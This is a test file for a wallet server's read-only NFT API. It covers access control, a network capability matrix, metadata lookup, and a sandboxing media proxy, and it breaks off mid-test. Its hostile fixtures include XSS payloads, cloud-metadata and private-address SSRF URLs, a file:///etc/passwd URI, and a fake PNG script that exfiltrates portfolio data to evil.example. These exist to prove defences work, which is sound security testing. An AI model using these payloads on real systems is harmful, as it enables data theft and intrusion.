// NFT API through the real server (own database): /api/v1/nfts/* — delivery 1, read-only.
//   chain sources: the recorded live answers (fixtures/nft); creator URLs: a scripted world (DNS + HTTP) that serves the REAL
//   metadata document of the reference item and a set of hostile documents; the wallet's addresses: injected (never a request
//   parameter). No network.
// Covered: owner session only, CSRF, validation; the 23-network matrix; the reference mint looked up with nothing invented;
// the media proxy (opaque ids, not an open proxy, sniffing, sandbox headers, SSRF refusals shown as "blocked"); hostile
// metadata kept inert; inventory sync (sections, pagination, filters, an NFT that left); manual tracking; refresh cooldown;
// activity (dedup, cursor); stable error codes; retention.
import { createHash, randomBytes } from 'node:crypto';
import { existsSync, mkdtempSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { NftAsset } from '@spw/nft';
import { loadFixture, replay, type Fixture } from './nft-helpers.ts';
import { useTestDatabase } from './test-db.ts';
import type { TransportRequest, TransportResponse } from '../src/nft/safe-fetch.ts';

const ORIGIN = 'https://wallet.test', REF = 'CMhGwGHMbVaBmxebfU3t5eViSf6FKHnvFCBNiA1D659j', KEY = `sol:solana:${REF}`;
const SOL_OWNER = '68KUHsNdR8er6DtWkWneEbJWoDme2MWLoHcwLawJ7gt', EVM_OWNER = '0xf17017dD78887f7A6d03a81E36FfBdF67eac2B8a';
const cacheDir = mkdtempSync(join(tmpdir(), 'spw-nft-test-'));
let app: any, sql: any, cookie = '', store: typeof import('../src/nft/store.ts'), service: any; // eslint-disable-line @typescript-eslint/no-explicit-any
let now = new Date('2026-11-17T12:00:00Z');
const tick = (ms: number) => { now = new Date(now.getTime() + ms); };

// ── the scripted outside world of creator-controlled URLs ───────────────────────────────────────────────────────────────
const refMeta = loadFixture('sol-core-reference-metadata') as unknown as { url: string; text: string; image: { url: string } };
const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0]);
const enc = (s: string) => new TextEncoder().encode(s);
const HOSTILE = {
  name: '<img src=x onerror="fetch(\'/api/v1/portfolio\')">‮gnp.exe', description: '<script>alert(document.cookie)</script>\n[click](javascript:alert(1))', external_url: 'javascript:alert(document.domain)',
  image: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', animation_url: 'https://evil.example/page.html',
  attributes: [{ trait_type: '<b>Bold</b>', value: '"><svg onload=alert(1)>' }, { trait_type: 'Dup', value: 1 }, { trait_type: 'Dup', value: 1 }, 'loose string', { trait_type: 'NoValue' }],
  properties: { files: [{ uri: 'https://evil.example/fake.png', type: 'image/png' }, { uri: 'https://evil.example/pic.svg', type: 'image/svg+xml' }, { uri: 'https://10.0.0.5/internal.png', type: 'image/png' }, { uri: 'https://rebind.example/a.png', type: 'image/png' }, { uri: 'https://evil.example/huge.png', type: 'image/png' }] },
};
const pages: Record<string, { status?: number; type?: string; body: Uint8Array; location?: string }> = {
  [refMeta.url]: { type: 'application/json', body: enc(refMeta.text) },
  [refMeta.image.url]: { type: 'image/png', body: PNG },
  'https://gateway.irys.xyz/5sfVqN7hVEPamtfNUejrkfCP9fk5hiL9eDngeX9cx9V3': { type: 'image/png', body: PNG },
  'https://evil.example/meta.json': { type: 'application/json', body: enc(JSON.stringify(HOSTILE)) },
  'https://evil.example/page.html': { type: 'text/html', body: enc('<!doctype html><html><body><script>top.location="https://phish.example"</script><h1>art</h1></body></html>') },
  'https://evil.example/fake.png': { type: 'image/png', body: enc('<html><script>fetch("/api/v1/portfolio").then(r=>r.text()).then(t=>navigator.sendBeacon("https://evil.example/x",t))</script></html>') },
  'https://evil.example/pic.svg': { type: 'image/svg+xml', body: enc('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(document.cookie)</script><circle r="4"/></svg>') },
  'https://evil.example/huge.png': { type: 'image/png', body: new Uint8Array(0) }, // answered as truncated by the transport below
  'https://evil.example/deep.json': { type: 'application/json', body: enc('{"a":'.repeat(50) + '1' + '}'.repeat(50)) },
  'https://evil.example/redirect.json': { status: 302, location: 'https://169.254.169.254/latest/meta-data/', body: new Uint8Array() },
  'https://evil.example/notjson.json': { type: 'application/json', body: enc('<html>not json</html>') },
};
const dialled: { url: string; address: string }[] = [], lookups: string[] = [];
const fetchDeps = {
  resolve: async (host: string) => { lookups.push(host); if (host === 'rebind.example') return [{ address: '127.0.0.1', family: 4 as const }]; if (/\.example$|irys\.xyz$|phygitals\.com$|arweave\.net$|ipfs\.io$|dweb\.link$|amazonaws\.com$/.test(host)) return [{ address: '93.184.216.34', family: 4 as const }]; throw new Error('ENOTFOUND'); },
  transport: async (req: TransportRequest): Promise<TransportResponse> => { dialled.push({ url: req.url.href, address: req.address });
    if (req.url.href === 'https://evil.example/huge.png') return { status: 200, headers: { 'content-type': 'image/png' }, body: new Uint8Array(8), truncated: true };
    const p = pages[req.url.href]; if (!p) return { status: 404, headers: {}, body: new Uint8Array(), truncated: false };
    return { status: p.status ?? 200, headers: { 'content-type': p.type, ...(p.location ? { location: p.location } : {}) }, body: p.body, truncated: false }; },
  now: () => now.getTime(),
};

// ── chain sources: recorded answers; the inventory fixture can be swapped to simulate an NFT leaving ──────────────────────
const fixtures: Fixture[] = ['sol-core-reference', 'sol-legacy-escrow', 'sol-pnft', 'sol-negative', 'sol-inventory', 'evm-lookups', 'evm-events'].map(loadFixture);
let world = replay(...fixtures);
const rpc = (url: string, method: string, params: unknown) => world.rpc(url, method, params);
const addresses = { solana: SOL_OWNER, ethereum: EVM_OWNER, base: EVM_OWNER, bitcoin: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' } as Record<string, string>;

async function call(method: string, path: string, o: { body?: unknown; cookie?: string | null; csrf?: boolean; headers?: Record<string, string> } = {}) {
  const headers: Record<string, string> = { ...(o.headers ?? {}) }, c = o.cookie === undefined ? cookie : o.cookie;
  if (c) headers.cookie = c;
  if (method !== 'GET' && o.csrf !== false) { headers.origin = ORIGIN; headers['x-spw-csrf'] = '1'; }
  if (o.body !== undefined) headers['content-type'] = 'application/json';
  const r = await app.inject({ method, url: `/api/v1${path}`, headers, payload: o.body === undefined ? undefined : JSON.stringify(o.body) });
  return { status: r.statusCode, headers: r.headers as Record<string, string>, raw: r.rawPayload as Buffer, json: (() => { try { return r.json(); } catch { return null; } })() };
}
/** identifiers of the scripted test chain are short words: padded to the length the route accepts for an address */
const pad = (chain: string, address: string) => (chain === 'testnet' ? `${address}${'_'.repeat(30)}`.slice(0, 30) : address);
const lookup = (chain: string, address: string, tokenId?: string) => call('POST', '/nfts/lookup', { body: { chain, address: pad(chain, address), ...(tokenId ? { tokenId } : {}) } });
const item = (key: string) => call('GET', `/nfts/item?key=${encodeURIComponent(key)}`);

/** a provider for the hostile asset: only its metadata URI matters (the resolver is what is under test) */
const hostileProvider = async () => {
  const { buildAsset, emptyMetadata } = await import('../src/nft/provider.ts'), { known, UNSUPPORTED, NONE } = await import('@spw/nft');
  const stamp = { category: 'onchain' as const, source: 'test-chain', detail: 'scripted', fetchedAt: now.toISOString(), confidence: 'chain_single_source' as const, freshness: 'fresh' as const, covers: ['ownership' as const] };
  const mk = (id: string, uri: string | null): NftAsset => buildAsset({ family: 'test', chainId: 'testnet', assetId: id, key: `test:testnet:${id}`, standard: 'unknown', ownerAddress: null, quantity: '1', metadata: emptyMetadata(uri, { onchainName: null }),
    ownership: { state: 'not_in_wallet', owner: known('someone'), tokenAccount: UNSUPPORTED, frozen: UNSUPPORTED, delegate: NONE, tokenRecordState: UNSUPPORTED, heldByWallet: false, source: stamp }, sources: [stamp], fetchedAt: now.toISOString(), origin: 'lookup', explorerUrl: null });
  const uris: Record<string, string | null> = { hostile: 'https://evil.example/meta.json', deep: 'https://evil.example/deep.json', redirect: 'https://evil.example/redirect.json', notjson: 'https://evil.example/notjson.json', plainhttp: 'http://evil.example/meta.json', local: 'https://localhost/meta.json', file: 'file:///etc/passwd', nouri: null,
    onchain: `data:application/json;base64,${Buffer.from(JSON.stringify({ name: 'On-chain doc', image: `data:image/svg+xml;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>').toString('base64')}`, attributes: [{ trait_type: 'Stored', value: 'on-chain' }] })).toString('base64')}` };
  return { id: 'test', family: 'test', chains: () => ['testnet'], inventory: async () => ({ assets: [], sections: [] }), events: async () => ({ events: [], cursor: null, completeness: 'unavailable' as const, note: null }), collection: async () => { throw new Error('none'); },
    lookup: async (_c: string, r0: { address: string }) => { const ref = { address: r0.address.replace(/_+$/, '') }; if (!(ref.address in uris)) { const { NftProviderError } = await import('@spw/nft'); throw new NftProviderError('not_found', 'test-chain', 'https://secret-host.example/v1?api-key=SECRETKEY'); } return mk(ref.address, uris[ref.address]!); } };
};

beforeAll(async () => {
  await useTestDatabase('nft_api', { NFT_CACHE_DIR: cacheDir });
  const db = await import('../src/db.ts'); sql = db.sql; await db.migrate();
  const token = randomBytes(32).toString('base64url');
  await sql`insert into sessions (id_hash, expires_at) values (${createHash('sha256').update(token).digest('hex')}, now() + interval '1 hour')`;
  cookie = `${(await import('../src/auth.ts')).COOKIE}=${token}`;
  store = await import('../src/nft/store.ts');
  const { nftConfig } = await import('../src/nft/config.ts'), { solanaProvider } = await import('../src/nft/solana.ts'), { evmProvider } = await import('../src/nft/evm.ts');
  const clock = () => now, cfg = nftConfig({ NFT_CACHE_DIR: cacheDir, NFT_INVENTORY_MAX: '40' });
  const providers = [solanaProvider({ rpc, now: clock, dasUrl: null }), evmProvider({ rpc, now: clock, indexers: {}, http: (async () => { throw new Error('no indexer'); }) as never }), await hostileProvider()];
  const { createResolver } = await import('../src/nft/resolver.ts'), { createNftService } = await import('../src/nft/service.ts'), { nftRoutes } = await import('../src/nft/routes.ts');
  // the server is built as in production; its NFT module is given the scripted sources
  app = await (await import('../src/server.ts')).buildServer({ nft: { cfg, providers: providers as never, fetch: fetchDeps, now: clock, addresses: async () => addresses, market: null, autoSync: false } });
  // the registry's network list is what `Chain` validates: the test chain is added to it for this file only (after the server
  // built its chain adapters: it has none)
  const { NETWORKS } = await import('@spw/core'); (NETWORKS as Record<string, unknown>).testnet = { id: 'testnet', family: 'test', name: 'Test chain', chainRef: 'x', native: { id: 'native', symbol: 'T', name: 'T', decimals: 0 }, tokens: [], rpc: [], explorerTx: '', explorerAddr: '', minConf: 1 };
  // the same service, for the tests that drive a synchronisation or the retention job directly
  const resolver = createResolver({ cfg, fetch: fetchDeps, now: clock });
  service = createNftService({ cfg, providers: providers as never, resolver, market: null, addresses: async () => addresses, now: clock });
  void nftRoutes;
}, 120_000);
afterAll(async () => { delete ((await import('@spw/core')).NETWORKS as Record<string, unknown>).testnet; await app?.close(); await sql?.end(); });

describe('access', () => {
  const routes: [string, string, unknown?][] = [['GET', '/nfts'], ['GET', '/nfts/capabilities'], ['GET', `/nfts/item?key=${KEY}`], ['GET', `/nfts/activity?key=${KEY}`], ['GET', '/nfts/collections'], ['GET', `/nfts/collection?key=${KEY}`], ['GET', '/nfts/receive'], ['GET', `/nfts/media/m${'0'.repeat(40)}`],
    ['POST', '/nfts/lookup', { chain: 'solana', address: REF }], ['POST', '/nfts/sync', {}], ['POST', '/nfts/refresh-metadata', { key: KEY }], ['POST', '/nfts/manual', { chain: 'solana', address: REF }], ['DELETE', `/nfts/manual?key=${KEY}`]];
  it('every NFT route needs the owner session; an API key is not accepted on these paths', async () => {
    for (const [m, p, body] of routes) { const r = await call(m, p, { body, cookie: null }); expect(r.status, `${m} ${p}`).toBe(401); expect(r.json.error).toBe('unauthenticated'); }
    for (const [m, p, body] of routes.slice(0, 3)) { const r = await call(m, p, { body, cookie: null, headers: { authorization: 'Bearer spw_live_0000000000000000000000000000000000000000' } }); expect([401, 403], `${m} ${p}`).toContain(r.status); }
  });
  it('a state-changing request without the CSRF header and origin is refused', async () => {
    for (const [m, p, body] of routes.filter((r) => r[0] !== 'GET')) expect((await call(m, p, { body, csrf: false })).status, `${m} ${p}`).toBe(403);
  });
  it('there is no approval or market-write route (delivery 2 added transfer/prepare and transfer/:id/approve — tested in nft-transfer.test.ts)', async () => {
    for (const p of ['/nfts/transfer', '/nfts/send', '/nfts/approve', '/nfts/set-approval', '/nfts/sign', '/nfts/list', '/nfts/buy', '/nfts/offer']) expect((await call('POST', p, { body: {} })).status, p).toBe(404);
  });
  it('parameters are validated: no owner address is accepted anywhere, keys and limits are bounded', async () => {
    expect((await call('GET', '/nfts?limit=101')).status).toBe(400); expect((await call('GET', '/nfts?chain=not-a-chain')).status).toBe(400); expect((await call('GET', '/nfts?sort=price')).status).toBe(400); // no price sort: there is no reliable price
    expect((await call('GET', '/nfts/item?key=nope')).status).toBe(400); expect((await call('GET', `/nfts/item?key=${'a'.repeat(400)}`)).status).toBe(400);
    expect((await call('POST', '/nfts/lookup', { body: { chain: 'solana', address: REF, ownerAddress: 'attacker' } })).status).toBe(400); // strict: unknown fields are refused
    expect((await call('POST', '/nfts/manual', { body: { chain: 'ethereum', address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', tokenId: '1', owner: EVM_OWNER } })).status).toBe(400);
    expect((await call('GET', '/nfts/media/https%3A%2F%2Fevil.example%2Fa.png')).status).toBe(400); expect((await call('GET', '/nfts/media/..%2F..%2Fetc%2Fpasswd')).status).toBe(400);
  });
});

describe('capabilities — the real matrix', () => {
  it('all 23 networks, each with its real state; transfers on Solana and the EVM networks only, no market write anywhere', async () => {
    const c = (await call('GET', '/nfts/capabilities')).json, chains = (c.chains as any[]).filter((x) => x.network !== 'testnet'); // eslint-disable-line @typescript-eslint/no-explicit-any
    expect(chains).toHaveLength(23);
    const by = Object.fromEntries(chains.map((x) => [x.network, x]));
    expect(by.solana).toMatchObject({ inventory: 'supported', lookup: true, manualAdd: true, standards: ['metaplex-token-metadata', 'metaplex-pnft', 'spl-token-2022', 'metaplex-core', 'metaplex-bubblegum'] });
    for (const n of ['ethereum', 'base', 'arbitrum', 'polygon', 'optimism', 'bsc', 'avalanche', 'hyperevm']) expect(by[n], n).toMatchObject({ inventory: 'blocked_by_provider', reason: 'no_keyless_discovery', unlockedBy: 'NFT_EVM_INDEXER_URLS', lookup: true, manualAdd: true, standards: ['erc721', 'erc1155'] });
    expect(by.bitcoin).toMatchObject({ inventory: 'blocked_by_provider', reason: 'ordinals_need_ord_indexer', lookup: false, manualAdd: false });
    for (const n of ['litecoin', 'dogecoin', 'bitcoincash', 'stellar', 'xrpl', 'tron', 'aptos', 'cosmos', 'sui', 'near', 'ton', 'cardano', 'polkadot']) expect(by[n], n).toMatchObject({ inventory: 'unsupported', reason: 'no_adapter', lookup: false, manualAdd: false, receive: false, standards: [] });
    expect(chains.every((x) => x.marketWrite === false)).toBe(true);
    expect(chains.filter((x) => x.transfer === 'supported').map((x) => x.network).sort()).toEqual(['arbitrum', 'avalanche', 'base', 'bsc', 'ethereum', 'hyperevm', 'optimism', 'polygon', 'solana']);
    expect(by.solana.transferStandards).toEqual(['spl-token-2022', 'metaplex-token-metadata', 'metaplex-pnft', 'metaplex-core']); expect(by.ethereum.transferStandards).toEqual(['erc721', 'erc1155']);
    expect(by.bitcoin).toMatchObject({ transfer: 'not_supported', transferReason: 'ordinals_transfer_not_supported', transferStandards: [] }); expect(by.cardano).toMatchObject({ transfer: 'not_supported', transferReason: 'no_adapter' });
    expect(c.providers.find((p: { id: string }) => p.id === 'opensea')).toEqual({ id: 'opensea', on: false, unlockedBy: 'OPENSEA_API_KEY', sends: 'not_built' });
    expect(JSON.stringify(c)).not.toMatch(/api[-_]?key=|secret/i);
  });
  it('the server capability list names the variables, never a value', async () => {
    const { nftCapabilities, nftConfig } = await import('../src/nft/config.ts');
    const off = nftCapabilities({}), on = nftCapabilities({ NFT_SOLANA_DAS_URL: 'https://mainnet.helius-rpc.com/?api-key=SUPERSECRET', NFT_EVM_INDEXER_URLS: '{"ethereum":"https://eth.blockscout.com"}', NFT_MARKET_MAGICEDEN: 'on', OPENSEA_API_KEY: 'SUPERSECRET2' });
    expect(off.map((c) => [c.id, c.on, c.missing])).toEqual([['nft_inventory', true, []], ['nft_solana_das', true, []], ['nft_evm_discovery', false, ['NFT_EVM_INDEXER_URLS']], ['nft_transfer', true, []], ['nft_ordinals', false, ['NFT_ORDINALS_API_URL']], ['nft_market_read', false, ['NFT_MARKET_MAGICEDEN']]]);
    expect(on.filter((c) => c.on).map((c) => c.id)).toEqual(['nft_inventory', 'nft_solana_das', 'nft_evm_discovery', 'nft_transfer', 'nft_market_read']); expect(JSON.stringify(on)).not.toContain('SUPERSECRET');
    expect(nftCapabilities({ NFT_EVM_INDEXER_URLS: '{"solana":"https://x"}' })[0]).toMatchObject({ id: 'nft', on: false });
    expect(() => nftConfig({ NFT_SOLANA_DAS_URL: 'http://plain.example/' })).toThrow(); expect(() => nftConfig({ NFT_IPFS_GATEWAYS: 'http://gw.example/ipfs/' })).toThrow(); expect(() => nftConfig({ NFT_EVM_INDEXER_URLS: 'not json' })).toThrow();
  });
});

describe('the reference item, looked up — real fields or nothing', () => {
  let a: any; // eslint-disable-line @typescript-eslint/no-explicit-any
  it('on-chain identity from the recorded chain answers; creator metadata from its declared URI; each labelled', async () => {
    const r = await lookup('solana', REF); expect(r.status, JSON.stringify(r.json)).toBe(200); a = r.json;
    expect(a).toMatchObject({ key: KEY, standard: 'metaplex-core', origin: 'lookup', quantity: '0', modelVersion: 1 }); // quantity = units held by THIS wallet: none
    expect(a.ownership).toMatchObject({ heldByWallet: false, state: 'not_in_wallet', owner: { state: 'known', value: '62Q9eeDY3eM8A5CnprBGYMPShdBjAzdpBdr71QHsS8dS' } }); expect(a.ownership.source.category).toBe('onchain');
    // creator metadata: exactly the document served that day
    const doc = JSON.parse(refMeta.text);
    expect(a.metadata).toMatchObject({ status: 'ok', name: doc.name, description: doc.description, onchainName: '2016 Pokemon XY Special Box Prom', sourceUri: refMeta.url, resolvedUri: refMeta.url, externalUrl: null });
    expect(a.metadata.source).toMatchObject({ category: 'creator_metadata', source: 'metadata-uri', detail: 'metadata.phygitals.com', confidence: 'creator_declared' });
    expect(a.metadata.attributes.map((x: { traitType: string; valueText: string }) => [x.traitType, x.valueText])).toEqual(doc.attributes.map((x: { trait_type: string; value: string }) => [x.trait_type, x.value])); expect(a.metadata.attributes).toHaveLength(9);
    expect(a.metadata.raw).toEqual(doc); expect(a.metadata.contentHash).toBe(createHash('sha256').update(refMeta.text).digest('hex'));
    expect(a.metadata.traitStatistics).toEqual({ computed: false, reason: 'no_collection_index' }); // no rarity is ever computed without a denominator
    expect(a.market).toBeNull(); expect(a.capabilities).toMatchObject({ transferable: false, transferBlockedBy: ['not_in_wallet'], transferWarnings: ['core_collection_permanent_delegate', 'mutable_metadata'], marketActions: false });
    expect(a.sources.map((s: { category: string }) => s.category)).toEqual(['onchain', 'creator_metadata']);
    expect(a.externalMarkets).toEqual([{ name: 'Magic Eden', url: `https://magiceden.io/item-details/${REF}` }, { name: 'OpenSea', url: `https://opensea.io/item/solana/${REF}` }]);
    // nothing invented: no price, no rank, no owner name, no rarity anywhere in the answer
    const text = JSON.stringify(a); for (const k of ['"rank"', '"rarity"', '"usd"', '"floorPrice"', '"lastSale":{"state":"known"']) expect(text, k).not.toContain(k);
  });
  it('media are opaque ids of this server — the answer never tells the browser to load a third-party URL', async () => {
    expect(a.media.map((m: { role: string; kind: string; status: string }) => [m.role, m.kind, m.status])).toEqual([['image', 'image', 'not_fetched'], ['file', 'image', 'not_fetched']]);
    for (const m of a.media) expect(m.id).toMatch(/^m[0-9a-f]{40}$/);
    expect(a.media[0].sourceUri).toBe(refMeta.image.url); // the provenance link is kept as written
  });
  it('a lookup is not part of the inventory', async () => {
    const l = (await call('GET', '/nfts')).json; expect(l.items.find((x: { key: string }) => x.key === KEY)).toBeUndefined();
    expect((await item(KEY)).json.key).toBe(KEY); // but it can be re-opened
  });
  it('the proxy serves it: fetched once from the validated address, typed from its bytes, sandboxed, then from the cache', async () => {
    const before = dialled.length, id = a.media[0].id, r = await call('GET', `/nfts/media/${id}`);
    expect(r.status).toBe(200); expect(r.headers['content-type']).toBe('image/png'); expect(Buffer.compare(r.raw, Buffer.from(PNG))).toBe(0);
    expect(r.headers['content-security-policy']).toMatch(/^sandbox; default-src 'none'/); expect(r.headers['x-content-type-options']).toBe('nosniff'); expect(r.headers['content-disposition']).toMatch(/^inline; filename="nft-[0-9a-f]{12}\.png"$/); expect(r.headers['set-cookie']).toBeUndefined();
    expect(dialled.slice(before)).toEqual([{ url: refMeta.image.url, address: '93.184.216.34' }]);
    expect((await call('GET', `/nfts/media/${id}`)).status).toBe(200); expect(dialled.length).toBe(before + 1); // cache
    expect((await call('GET', `/nfts/media/${id}?info=1`)).json).toEqual({ status: 'available', mime: 'image/png', kind: 'image', bytes: PNG.length });
    expect(readdirSync(cacheDir)).toContain(id);
    expect((await item(KEY)).json.media[0]).toMatchObject({ status: 'available', mime: 'image/png', bytes: String(PNG.length) });
  });
  it('it is not an open proxy: an id that was never registered by an asset is 404, whatever it is', async () => {
    const { mediaIdOf } = await import('../src/nft/resolver.ts'), n = dialled.length;
    expect((await call('GET', `/nfts/media/${mediaIdOf('https://example.com/any.png')}`)).status).toBe(404); expect((await call('GET', `/nfts/media/m${'f'.repeat(40)}`)).status).toBe(404);
    expect((await call('GET', `/nfts/media/${a.media[0].id}?url=https://example.com/other.png`)).headers['content-type']).toBe('image/png'); // a url parameter changes nothing
    expect(dialled.length).toBe(n);
  });
  it('its activity: stored once, deduplicated across re-scans, paged by cursor, filtered by type', async () => {
    const p1 = (await call('GET', `/nfts/activity?key=${KEY}&limit=3`)).json;
    expect(p1.completeness).toBe('full'); expect(p1.events).toHaveLength(3); expect(p1.events[0]).toMatchObject({ type: 'transfer', at: '2026-11-10T16:40:35.000Z', price: null }); expect(p1.cursor).toBeTruthy(); expect(p1.canLoadOlder).toBe(true);
    const p2 = (await call('GET', `/nfts/activity?key=${KEY}&limit=3&cursor=${encodeURIComponent(p1.cursor)}`)).json;
    expect(p2.events).toHaveLength(3); expect(p2.events.map((e: { id: string }) => e.id).some((id: string) => p1.events.map((e: { id: string }) => e.id).includes(id))).toBe(false);
    tick(6 * 60_000); // past the re-scan interval: the same page is read again from the chain source — and nothing is duplicated
    await call('GET', `/nfts/activity?key=${KEY}&limit=50`);
    expect((await sql`select count(*)::int as n, count(distinct id)::int as d from nft_events where asset_key = ${KEY}`)[0]).toEqual({ n: 8, d: 8 });
    const unk = (await call('GET', `/nfts/activity?key=${KEY}&type=unknown`)).json; expect(unk.events).toHaveLength(1); expect(unk.events.every((e: { type: string }) => e.type === 'unknown')).toBe(true);
    expect((await call('GET', `/nfts/activity?key=${KEY}&type=sale`)).json.events).toEqual([]); // no sale is ever inferred
  });
  it('"refresh metadata" re-reads the creator document, at most once a minute, and cannot change what the chain says', async () => {
    const before = (await item(KEY)).json, n = dialled.filter((d) => d.url === refMeta.url).length;
    pages[refMeta.url] = { type: 'application/json', body: enc(JSON.stringify({ ...JSON.parse(refMeta.text), name: 'RENAMED BY CREATOR', owner: 'attacker', attributes: [] })) };
    const r = await call('POST', '/nfts/refresh-metadata', { body: { key: KEY } }); expect(r.status, JSON.stringify(r.json)).toBe(200);
    expect(dialled.filter((d) => d.url === refMeta.url).length).toBe(n + 1);
    expect(r.json.metadata.name).toBe('RENAMED BY CREATOR'); expect(r.json.metadata.attributes).toEqual([]);
    expect(r.json.metadata.onchainName).toBe(before.metadata.onchainName); expect(r.json.ownership.owner).toEqual(before.ownership.owner); expect(r.json.collection.id).toBe(before.collection.id); expect(r.json.standard).toBe(before.standard);
    const again = await call('POST', '/nfts/refresh-metadata', { body: { key: KEY } }); expect(again.status).toBe(429); expect(again.json).toMatchObject({ error: 'nft_provider_rate_limited', data: { source: 'spw', detail: 'refresh_cooldown' } });
    tick(61_000); pages[refMeta.url] = { type: 'application/json', body: enc(refMeta.text) };
    expect((await call('POST', '/nfts/refresh-metadata', { body: { key: KEY } })).json.metadata.name).toBe(JSON.parse(refMeta.text).name);
  });
});

describe('hostile metadata stays inert', () => {
  let a: any; // eslint-disable-line @typescript-eslint/no-explicit-any
  const media = (uri: string) => a.media.find((m: { sourceUri: string }) => m.sourceUri === uri);
  it('text is kept as text; a javascript: link is dropped; every attribute is preserved, malformed ones flagged', async () => {
    const r = await lookup('testnet', 'hostile'); expect(r.status, JSON.stringify(r.json)).toBe(200); a = r.json;
    expect(a.metadata.name).toBe('<img src=x onerror="fetch(\'/api/v1/portfolio\')">gnp.exe'); // the bidi override is gone; the markup is characters (rendered as text by the UI — apps/web/test/nft.test.ts)
    expect(a.metadata.description).toContain('<script>alert(document.cookie)</script>'); expect(a.metadata.externalUrl).toBeNull();
    expect(a.metadata.attributes).toHaveLength(5); expect(a.metadata.attributes.map((x: { malformed: boolean }) => x.malformed)).toEqual([false, false, false, true, true]); expect(a.metadata.attributes[1]).toMatchObject({ traitType: 'Dup', value: 1 }); expect(a.metadata.attributes[2]).toMatchObject({ traitType: 'Dup', value: 1 });
    expect(a.metadata.raw.external_url).toBe('javascript:alert(document.domain)'); // raw is kept, apart
  });
  it('an image on the cloud-metadata address, over http: blocked at registration — never requested', async () => {
    const m = media(HOSTILE.image); expect(m).toMatchObject({ status: 'blocked', errorCode: 'scheme_not_allowed' });
    const n = dialled.length, r = await call('GET', `/nfts/media/${m.id}`); expect(r.status).toBe(403); expect(r.json).toMatchObject({ error: 'media_blocked', data: { code: 'scheme_not_allowed' } }); expect(dialled.length).toBe(n);
  });
  it('private address, rebinding name, oversized file: refused with a code, shown as blocked', async () => {
    for (const [uri, status, code] of [['https://10.0.0.5/internal.png', 403, 'private_address'], ['https://rebind.example/a.png', 403, 'private_address'], ['https://evil.example/huge.png', 413, 'too_large']] as const) {
      const r = await call('GET', `/nfts/media/${media(uri).id}`); expect(r.status, uri).toBe(status); expect(r.json.data.code, uri).toBe(code); expect(r.headers['content-type'], uri).toMatch(/application\/json/);
    }
    expect(dialled.some((d) => d.url.includes('10.0.0.5') || d.address === '127.0.0.1' || d.address === '10.0.0.5')).toBe(false);
  });
  it('a "PNG" that is HTML with a script is refused as mislabelled — not rendered, not served', async () => {
    const r = await call('GET', `/nfts/media/${media('https://evil.example/fake.png').id}`); expect(r.status).toBe(403); expect(r.json).toMatchObject({ error: 'media_blocked', data: { code: 'mime_mismatch' } }); expect(r.raw.toString()).not.toContain('<script>');
    expect(existsSync(join(cacheDir, media('https://evil.example/fake.png').id))).toBe(false);
  });
  it('an SVG with scripts is served as an image with a sandboxing CSP (inert in <img>, inert if opened directly)', async () => {
    const r = await call('GET', `/nfts/media/${media('https://evil.example/pic.svg').id}`); expect(r.status).toBe(200); expect(r.headers['content-type']).toBe('image/svg+xml; charset=utf-8');
    expect(r.headers['content-security-policy']).toBe("sandbox; default-src 'none'; style-src 'unsafe-inline'; img-src data:; frame-ancestors 'none'"); expect(r.headers['x-content-type-options']).toBe('nosniff');
  });
  it('HTML: served only sandboxed — no script unless the owner asked to run it, and then still without same origin or network', async () => {
    const id = media('https://evil.example/page.html').id, still = await call('GET', `/nfts/media/${id}`), run = await call('GET', `/nfts/media/${id}?run=1`);
    expect(still.status).toBe(200); expect(still.headers['content-type']).toBe('text/html; charset=utf-8');
    expect(still.headers['content-security-policy']).toMatch(/^sandbox; default-src 'none'/); expect(still.headers['content-security-policy']).not.toContain('allow-scripts');
    expect(run.headers['content-security-policy']).toMatch(/^sandbox allow-scripts; default-src 'none'/);
    for (const h of [still, run]) { expect(h.headers['content-security-policy']).not.toMatch(/allow-same-origin|allow-top-navigation|allow-forms|allow-popups/); expect(h.headers['content-security-policy']).toContain("connect-src 'none'"); expect(h.headers['x-frame-options']).toBe('SAMEORIGIN'); }
    expect((await call('GET', `/nfts/media/${id}?info=1`)).json).toMatchObject({ status: 'available', kind: 'html', mime: 'text/html' });
  });
  it('metadata documents: too deep, not JSON, redirected to an internal address, forbidden schemes and hosts, no URI', async () => {
    for (const [id, status, code] of [['deep', 'malformed', 'json_too_deep'], ['notjson', 'malformed', 'json_malformed'], ['redirect', 'blocked', 'private_address'], ['plainhttp', 'blocked', 'scheme_not_allowed'], ['local', 'blocked', 'forbidden_host'], ['file', 'blocked', 'scheme_not_allowed']] as const) {
      const r = await lookup('testnet', id); expect(r.status, id).toBe(200); expect(r.json.metadata, id).toMatchObject({ status, errorCode: code, name: null, description: null, attributes: [], raw: null }); expect(r.json.media, id).toEqual([]);
    }
    expect((await lookup('testnet', 'nouri')).json.metadata).toMatchObject({ status: 'no_uri', sourceUri: null, name: null });
    expect(dialled.some((d) => d.url.startsWith('https://169.254.') || d.url.startsWith('http://') || d.url.includes('localhost'))).toBe(false);
  });
  it('an on-chain data: document is read without any request; its data: SVG image is served sandboxed', async () => {
    const n = dialled.length, r = await lookup('testnet', 'onchain');
    expect(r.json.metadata).toMatchObject({ status: 'ok', name: 'On-chain doc', resolvedUri: null }); expect(r.json.metadata.source.detail).toBe('data: URI (on-chain)'); expect(r.json.metadata.attributes[0]).toMatchObject({ traitType: 'Stored', value: 'on-chain' });
    const m = await call('GET', `/nfts/media/${r.json.media[0].id}`); expect(m.status).toBe(200); expect(m.headers['content-type']).toBe('image/svg+xml; charset=utf-8'); expect(m.headers['content-security-policy']).toMatch(/^sandbox;/); expect(dialled.length).toBe(n);
  });
  it('a provider failure reaches the client as a stable code and a source — never a URL, a key or a body', async () => {
